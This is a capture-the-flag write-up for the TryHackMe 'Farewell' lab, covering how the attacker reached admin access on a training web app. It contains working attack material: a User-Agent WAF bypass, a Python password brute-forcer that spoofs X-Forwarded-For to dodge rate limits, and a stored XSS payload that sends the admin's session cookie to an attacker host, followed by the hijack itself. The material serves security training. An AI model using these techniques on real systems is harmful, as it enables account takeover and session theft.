# Farewell: Write-up (TryHackMe)

**Platform:** TryHackMe  
  
---

## 1. Introduction

The **Farewell** challenge involves exploring a legacy web application scheduled for decommissioning. The objective is to gain administrative access by exploiting configuration flaws, information leakage, and Stored Cross-Site Scripting (XSS).

---

## 2. Reconnaissance & Enumeration

### Connectivity & Port Scanning
I began by verifying connectivity and scanning for exposed services.

```bash
# Connectivity Test
ping -c 4 10.65.158.144
```

Using `nmap` for port scanning and service enumeration:

```bash
# Fast Scan
sudo nmap -sS -p- --min-rate 1000 -T4 -Pn -n 10.65.158.144

# Service & Version Detection
sudo nmap -sV -sC -p22,80 -Pn -n 10.65.158.144
```

**Results:**
* **Port 22 (SSH):** OpenSSH 9.6p1 (Ubuntu)
* **Port 80 (HTTP):** Apache 2.4.58 (Ubuntu)
    * `PHPSESSID` cookie present (missing `HttpOnly` flag).
    * Title: "Farewell: Login".

### Web Fingerprinting

```bash
whatweb http://10.65.158.144
```
The tool confirmed the PHP stack via session cookies and the Apache server running on Ubuntu.

### Web Application Analysis (Port 80)

Accessing the web root (`/`), I inspected the HTTP headers and source code:

```bash
curl -i http://10.65.158.144/
```

**Key Discoveries:**
1.  **Technology Stack:** Apache/2.4.58 + PHP.
2.  **Potential Users:** A news ticker on the homepage displays the names `adam`, `deliver11`, and `nora`.
3.  **Attack Vector:** A `check.js` script is loaded at the bottom of the page, suggesting client-side validation logic.

### Client-Side Logic Analysis (`check.js`)

Reviewing `check.js` revealed how the authentication mechanism works:

```bash
curl -s http://10.65.158.144/check.js
```

**Code Analysis:**
* The form submits data to `POST /auth.php`.
* **Information Disclosure (CWE-209):** The script checks if the response contains `data.user.password_hint`. This indicates that the server leaks password hints if a username exists, even if the password provided is incorrect.

---

## 3. Exploitation: User Enumeration & WAF Bypass

Attempting to interact with `/auth.php` resulted in a `403 Forbidden` response with the message "WAF is Active". I deduced that the firewall was blocking User-Agents associated with CLI tools.

**Bypass:** Changing the User-Agent to simulate a legitimate browser.

```bash
curl -s -i -X POST http://10.65.158.144/auth.php \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'User-Agent: Mozilla/5.0' \
-d 'username=test&password=test'
```

### Password Hint Enumeration
Testing the usernames found in the ticker confirmed the leakage of password hints:

```bash
curl -s -i -b cookies.txt -X POST http://10.65.158.144/auth.php \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'User-Agent: Mozilla/5.0' \
-d 'username=deliver11&password=test'
```

**Collected Hints Table:**

| User | Password Hint | Deduced Pattern |
| :--- | :--- | :--- |
| `adam` | favorite pet + 2 | Animal + 2 digits |
| `deliver11` | Capital of Japan followed by 4 digits | **TokyoXXXX** |
| `nora` | lucky number 789 | Contains 789 |
| `admin` | the year plus a kind send-off | **2025farewell** (or similar) |

*> The `admin` user was discovered via fuzzing with `ffuf`, filtering for responses containing "password_hint".*

---

## 4. Optimized Brute Force Attack

For the user `deliver11`, the password pattern was clear: `Tokyo` followed by 4 digits. I developed a custom Python script to perform the attack efficiently while bypassing rate limits and WAF restrictions.

**Script Highlights:**
* **Rate Limit Bypass:** IP rotation via `X-Forwarded-For` header.
* **Congestion Control:** Latency monitoring to prevent DoS or server-side blocking.

```python
import requests
import random
import time

# Target Configuration
TARGET_URL = "http://10.65.158.144/auth.php"
USERNAME = "deliver11"

def get_random_ip():
    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

def brute_force_speedrun():
    session = requests.Session()
    current_sleep = 0.05
    
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Starting Speedrun Mode:")

    # Updated range to include 9999 (0 to 10000 excludes the upper bound)
    for i in range(10000):
        password = f"Tokyo{i:04d}"
        
        headers = {
            "X-Forwarded-For": get_random_ip(), 
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        }

        try:
            request_start = time.time()
            response = session.post(
                TARGET_URL, 
                data={'username': USERNAME, 'password': password}, 
                headers=headers, 
                timeout=5
            )
            latency = time.time() - request_start

            # Adaptive Latency Control
            if latency > 1.2: 
                current_sleep = 0.4
                print(f"\n[!] ALERT: High Latency ({latency:.2f}s). Throttling down...")
            elif latency < 0.3:
                current_sleep = max(0.01, current_sleep - 0.01)

            if "auth_failed" in response.text:
                print(f"[-] {password} | Lat: {latency:.2f}s", end='\r')
            else:
                print(f"\n\n[SUCCESS] PASSWORD FOUND: {password}")
                break

            time.sleep(current_sleep)

        except Exception:
            time.sleep(15)
            current_sleep = 0.2

if __name__ == "__main__":
    brute_force_speedrun()
```

**Result:** Password found successfully, granting access to the Dashboard.

---

## 5. Post-Auth Directory Enumeration

I used `ffuf` to map the internal structure of the application:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.65.158.144/FUZZ -H 'User-Agent: Mozilla/5.0'
```

**Output:**
```text
admin.php     [Status: 200, Size: 5246, Words: 660, Lines: 109, Duration: 165ms]
index.php     [Status: 200, Size: 5246, Words: 660, Lines: 109, Duration: 159ms]
info.php      [Status: 200, Size: 87552, Words: 4347, Lines: 1054, Duration: 171ms]
```
The discovery of `admin.php` and `info.php` confirmed the attack surface for privilege escalation.

---

## 6. Post-Exploitation: Stored XSS & Session Hijacking

Upon accessing the dashboard (`dashboard.php`), I identified a message submission form. Initial tests showed that the server sanitized basic HTML tags, but an administrative bot was actively reviewing the messages.

### Payload Construction
To bypass the WAF blocking keywords like `cookie` and `document`, I used string concatenation and image loading for exfiltration.

**Payload Used:**
```html
<body onload="new Image().src='http://<ATTACKER-IP>:4444?x='+document['coo'+'kie']">
```

### Attack Execution
1.  Injected the payload into the message field.
2.  The system flagged it as "Pending Review".
3.  The administrative bot viewed the message, executing the JavaScript.

**Netcat Capture:**
```bash
# Note: The source IP (10.65.158.144) is the target connecting back
connect to [192.168.129.73] from (UNKNOWN) [10.65.158.144] 57982
GET /?PHPSESSID=2bcp5hdqg2cd4r9qcmqp9bf1lb HTTP/1.1
Host: 192.168.129.73:4444
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2...)
Referer: http://localhost/
```

### Gaining Admin Access
With the administrator's `PHPSESSID` cookie in hand, I performed Session Hijacking to access the restricted panel.

```bash
curl http://10.65.158.144/admin.php \
-H 'User-Agent: Mozilla/5.0' \
-H 'Cookie: PHPSESSID=2bcp5hdqg2cd4r9qcmqp9bf1lb'
```

**Output:**
```html
<div class="sub" style="color:#9aa4b2;">Logged in as <strong>admin</strong> - Flag: THM{[REDACTED]}</div>
```

---

